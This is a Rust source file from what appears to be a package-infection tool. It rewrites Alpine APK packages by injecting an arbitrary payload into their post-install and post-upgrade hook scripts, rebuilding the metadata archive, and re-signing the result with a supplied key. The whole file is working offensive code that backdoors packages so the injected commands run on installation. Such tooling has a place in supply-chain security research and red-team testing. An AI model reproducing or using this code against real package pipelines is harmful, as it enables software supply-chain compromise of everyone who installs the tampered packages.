use crate::errors::*;
use crate::plot::SigningKeys;
use crate::shell;
use crate::sign;
use crate::utils;
use openssl::hash::MessageDigest;
use serde::{Deserialize, Serialize};
use std::io;
use std::io::BufReader;
use std::io::prelude::*;
use tar::Archive;

pub fn patch_signature_buf(
    infect: &Infect,
    signing_keys: &SigningKeys,
    signature_buf: &[u8],
    pkg: &[u8],
) -> Result<Vec<u8>> {
    let key = signing_keys
        .get(&infect.signing_key)
        .with_context(|| anyhow!("Invalid signing key reference: {:?}", infect.signing_key))?
        .openssl()?;

    let signature = sign::openssl::sign(key, pkg, MessageDigest::sha1())?;
    let key_algo_id = key.key_algo_id().unwrap_or("XXX");

    utils::apk::patch_signature_container(
        signature_buf,
        &signature,
        key_algo_id,
        &infect.signing_key_name,
    )
}

pub fn patch_metadata_buf(infect: &Infect, buf: &[u8]) -> Result<Vec<u8>> {
    let mut out = Vec::new();
    let mut builder = tar::Builder::new(&mut out);
    let mut archive = Archive::new(buf);
    for entry in archive.entries()?.raw(true) {
        let mut entry = entry?;
        let mut header = entry.header().clone();
        debug!("Found entry in tar: {:?}", header.path());
        let path = header.path()?;
        let filename = path
            .to_str()
            .with_context(|| anyhow!("Package contains paths with invalid encoding: {:?}", path))?;

        match (&infect.payload, filename) {
            (Some(payload), ".post-install" | ".post-upgrade") => {
                let mut script = String::new();
                entry.read_to_string(&mut script)?;
                debug!("Found existing hook for {:?}: {:?}", filename, script);

                let script = shell::inject_into_script(&script, payload)
                    .context("Failed to inject into package hook")?;

                let buf = script.as_bytes();
                header.set_size(buf.len() as u64);
                header.set_cksum();

                builder.append(&header, &mut &buf[..])?;
            }
            _ => {
                builder.append(&header, &mut entry)?;
            }
        }
    }
    builder.into_inner()?;

    debug!("Stripping the tar termination section (1024 zero bytes)");
    out.truncate(out.len() - 1024);

    Ok(out)
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub struct Infect {
    pub signing_key: String,
    pub signing_key_name: String,
    pub payload: Option<String>,
}

pub fn infect<W: Write>(
    infect: &Infect,
    signing_keys: &SigningKeys,
    pkg: &[u8],
    out: &mut W,
) -> Result<()> {
    let mut reader = BufReader::new(pkg);

    debug!("Reading compressed signature buffer...");
    let signature_buf = utils::apk::read_gzip_to_end(&mut reader)?;

    let mut pkg = Vec::new();
    debug!("Reading compressed metadata buffer...");
    let metadata_buf = utils::apk::read_gzip_to_end(&mut reader)?;
    let metadata_buf = patch_metadata_buf(infect, &metadata_buf)?;
    utils::apk::write_compressed(&mut &metadata_buf[..], &mut pkg)?;

    debug!("Patching signature...");
    let signature_buf = patch_signature_buf(infect, signing_keys, &signature_buf, &pkg)?;

    debug!("Streaming remaining package contents...");
    let n = io::copy(&mut reader, &mut pkg)?;
    debug!("Forwarded {} bytes", n);

    utils::apk::write_compressed(&mut &signature_buf[..], out)?;
    io::copy(&mut &pkg[..], out)?;

    Ok(())
}
